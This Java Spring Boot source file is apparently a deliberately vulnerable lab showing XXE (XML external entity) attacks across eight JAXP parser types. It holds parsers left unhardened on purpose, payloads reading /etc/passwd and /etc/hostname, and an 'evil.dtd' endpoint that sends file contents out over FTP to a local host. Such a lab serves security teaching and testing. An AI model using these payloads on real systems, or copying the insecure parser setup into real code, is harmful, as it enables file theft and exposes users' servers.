package org.fjank.vulnerable_xml_1;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.bootstrap.DOMImplementationRegistry;
import org.w3c.dom.ls.DOMImplementationLS;
import org.w3c.dom.ls.LSInput;
import org.w3c.dom.ls.LSParser;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;

import javax.xml.parsers.*;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamConstants;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Result;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;
import javax.xml.validation.Schema;
import javax.xml.validation.SchemaFactory;
import javax.xml.validation.Validator;
import javax.xml.xpath.*;
import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import static java.util.Collections.singletonMap;

@SpringBootApplication
@RestController
public class VulnerableXml1Application {
    // all the getters
    @RequestMapping(value = "/", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableDom() {
        return getHTML(getStandardPayload(), "DOM");
    }

    @RequestMapping(value = "/vulnerableSAX", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableSAX() {
        return getHTML(getStandardPayload(), "SAX");
    }

    @RequestMapping(value = "/vulnerableStAX", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableStAX() {
        return getHTML(getStandardPayload(), "StAX");
    }

    @RequestMapping(value = "/vulnerableSchema", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableSchema() {
        return getHTML(getSchemaPayload(), "Schema");
    }


    @RequestMapping(value = "/vulnerableValidate", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableValidate() {
        return getHTML(getValidatePayload(), "Validate");
    }

    @RequestMapping(value = "/vulnerableTrAX", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableTrAX() {
        return getHTML(getStandardPayload(), "TrAX");
    }

    @RequestMapping(value = "/vulnerableXPath", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableXPath() {
        return getHTML(getStandardPayload(), "XPath");
    }

    @RequestMapping(value = "/vulnerableDOMLS", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String vulnerableDOMLS() {
        return getHTML(getStandardPayload(), "DOMLS");
    }

    @RequestMapping(value = "/evil.dtd", produces = MediaType.TEXT_HTML_VALUE, method = RequestMethod.GET)
    public String evilDTD() {
        return "<!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://127.0.0.1:2121/%file;'>\">\n" +
                "%all;\n";
    }

    @RequestMapping(value = "/", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableDom(@RequestBody String xml) {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            Document doc = db.parse(new InputSource(new StringReader(xml)));
            String rv = getStringFromDocument(doc);
            return singletonMap("response", rv);
        } catch (SAXException | IOException | ParserConfigurationException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableSAX", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableSAX(@RequestBody String xml) {
        try {
            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser sp = spf.newSAXParser();
            XMLReader xmlReader = sp.getXMLReader();
            TestExtractor testExtractor = new TestExtractor();
            xmlReader.setContentHandler(testExtractor);
            xmlReader.parse(new InputSource(new StringReader(xml)));
            return singletonMap("response", testExtractor.getResult());
        } catch (ParserConfigurationException | IOException | SAXException e) {
            return singletonMap("response", e.getMessage());
        }

    }

    @RequestMapping(value = "/vulnerableStAX", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableStAX(@RequestBody String xml) {
        try {
            boolean testElementActive = false;
            StringBuilder rv = new StringBuilder();
            XMLInputFactory f = XMLInputFactory.newInstance();
            XMLStreamReader r = f.createXMLStreamReader(new StringReader(xml));
            while (r.hasNext()) {
                r.next();
                if (r.getEventType() == XMLStreamConstants.START_ELEMENT && r.getName().getLocalPart().equals("test")) {
                    testElementActive = true;
                }
                if (r.getEventType() == XMLStreamConstants.END_ELEMENT && r.getName().getLocalPart().equals("test")) {
                    testElementActive = false;
                }
                if (r.getEventType() == XMLStreamConstants.CHARACTERS && testElementActive) {
                    rv.append(r.getText());
                }
            }
            return singletonMap("response", rv.toString());
        } catch (XMLStreamException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableSchema", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableSchema(@RequestBody String xml) {
        try {
            SchemaFactory sf = SchemaFactory.newDefaultInstance();
            Schema schema = sf.newSchema(new StreamSource(new StringReader(xml)));
            return singletonMap("response", "Schema loaded successfully");
        } catch (SAXException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableValidate", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableValidate(@RequestBody String xml) {
        try {
            SchemaFactory sf = SchemaFactory.newDefaultInstance();
            String schemaXml = getSchema(true, null);
            Schema schema = sf.newSchema(new StreamSource(new StringReader(schemaXml)));
            Validator validator = schema.newValidator();
            validator.validate(new StreamSource(new StringReader(xml)));
            return singletonMap("response", "Validated successfully");
        } catch (SAXException | IOException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableTrAX", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableTrAX(@RequestBody String xml) {
        String xslt = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<xsl:stylesheet version=\"1.0\"\n" +
                "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
                "<xsl:output method=\"text\" indent=\"no\" encoding=\"UTF-8\" omit-xml-declaration=\"yes\" />" +
                "<xsl:template match=\"/root/test\">\n" +
                "<xsl:value-of select=\".\"/>" +
                "</xsl:template>\n" +
                "</xsl:stylesheet>";
        try {
            TransformerFactory tf = TransformerFactory.newDefaultInstance();
            StringWriter writer = new StringWriter();
            Result result = new StreamResult(writer);
            Transformer t = tf.newTransformer(new StreamSource(new StringReader(xslt)));
            t.transform(new StreamSource(new StringReader(xml)), result);
            return singletonMap("response", writer.toString());
        } catch (TransformerException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableXPath", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableXPath(@RequestBody String xml) {
        try {
            XPathFactory xpf = XPathFactory.newDefaultInstance();
            XPath xPath = xpf.newXPath();
            XPathExpression xpe = xPath.compile("/root/test/.");
            String result = (String) xpe.evaluate(new InputSource(new StringReader(xml)), XPathConstants.STRING);
            return singletonMap("response", result);
        } catch (XPathExpressionException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    @RequestMapping(value = "/vulnerableDOMLS", produces = MediaType.APPLICATION_JSON_VALUE, method = RequestMethod.POST)
    public Map<String, String> vulnerableDOMLS(@RequestBody String xml) {
        try {
            DOMImplementationRegistry registry = DOMImplementationRegistry.newInstance();
            DOMImplementationLS impl = (DOMImplementationLS) registry.getDOMImplementation("LS");
            LSParser builder = impl.createLSParser(DOMImplementationLS.MODE_SYNCHRONOUS, "http://www.w3.org/2001/XMLSchema");
            LSInput lsInput = impl.createLSInput();
            lsInput.setCharacterStream(new StringReader(xml));
            Document doc = builder.parse(lsInput);
            String rv = getStringFromDocument(doc);
            return singletonMap("response", rv);
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException e) {
            return singletonMap("response", e.getMessage());
        }
    }

    private String getStandardPayload() {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                "<root>\n" +
                "<test>&xxe;</test>\n" +
                "</root>\n";
    }

    private String getSchemaPayload() {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
                getSchema(false, "&xxe;");
    }

    private String getValidatePayload() {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE data [\n" +
                "  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n" +
                "  <!ENTITY % dtd SYSTEM \"http://localhost:8080/evil.dtd\">\n" +
                "  %dtd;\n" +
                "]>\n" +
                "<root>\n" +
                "<test>&send;</test>\n" +
                "</root>\n";
    }

    private String getSchema(boolean includeDecl, String entity) {
        String schema = "<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n" +
                "<xs:element name=\"root\">" +
                "<xs:complexType>\n" +
                "    <xs:sequence>\n" +
                "      <xs:element name=\"test\" type=\"xs:string\"/>" +
                (entity != null ? entity : "") +
                "    </xs:sequence>\n" +
                "  </xs:complexType>\n" +
                "</xs:element>" +
                "</xs:schema>";
        if (includeDecl) {
            return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + schema;
        }
        return schema;
    }

    private String getHTML(String payload, String method) {
        StringBuilder res = new StringBuilder("<style>\n" +
                "#result {border:1px solid gray;padding:5px;border-radius:5px}\n" +
                "body {font-family:Verdana,Arial,sans-serif}\n" +
                "h1 {font-size:16px}" +
                "</style>\n" +
                "<script>\n" +
                "function sendXml() {\n" +
                "var r = new XMLHttpRequest();\n");
        if (method.equals("DOM")) {
            res.append("r.open('POST', '/', false);\n");
        } else {
            res.append("r.open('POST', '/vulnerable" + method + "', false);\n");
        }
        res.append("r.setRequestHeader('Content-Type', 'application/xml');\n" +
                "xml = document.getElementById('xml').value;\n" +
                "r.send(xml);\n" +
                "result = JSON.parse(r.responseText).response;\n" +
                "document.getElementById('result').innerText = result;\n" +
                "}\n" +
                "</script>\n" +
                "<div>");
        for (String m : getJAXPMethods()) {
            if (m.equals(method)) {
                res.append("<span>" + m + "</span> ");
            } else if (m.equals("DOM")) {
                res.append("<a href=\"/\">" + m + "</a> ");
            } else {
                res.append("<a href=\"/vulnerable" + m + "\">" + m + "</a> ");
            }
        }
        res.append("</div>" +
                "<h1>Sends an XXE payload to the server which parses the XML using JAXP " + method + ".</h1>" +
                "<textarea rows=10 cols=120 id=\"xml\">" + payload + "</textarea><br>\n" +
                "<button onclick=\"sendXml()\">Send XML</button><br>\n" +
                "Result:<br>" +
                "<pre id=\"result\"></pre>\n");
        return res.toString();
    }

    private List<String> getJAXPMethods() {
        List<String> methods = new ArrayList<>();
        methods.add("DOM");
        methods.add("SAX");
        methods.add("StAX");
        methods.add("Schema");
        methods.add("Validate");
        methods.add("TrAX");
        methods.add("XPath");
        methods.add("DOMLS");
        return methods;
    }

    private String getStringFromDocument(Document doc) {
        NodeList list = doc.getElementsByTagName("test");
        for (int temp = 0; temp < list.getLength(); temp++) {
            Node node = list.item(temp);
            if (node.getNodeType() == Node.ELEMENT_NODE) {
                Element element = (Element) node;
                // get test's attribute
                return element.getTextContent();
            }
        }
        return "Not found";
    }

    public static void main(String[] args) {
        SpringApplication.run(VulnerableXml1Application.class, args);
    }
}
